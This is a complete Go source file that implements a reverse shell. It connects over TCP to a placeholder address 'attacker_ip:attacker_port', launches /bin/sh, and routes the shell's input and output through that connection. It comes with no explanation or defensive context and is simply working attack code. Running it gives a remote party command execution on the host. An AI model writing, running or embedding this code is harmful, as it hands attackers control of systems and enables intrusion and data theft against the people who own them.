package main

import (
    "net"
    "os/exec"
)

func main() {
    conn, _ := net.Dial("tcp", "attacker_ip:attacker_port")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
    cmd.Run()
}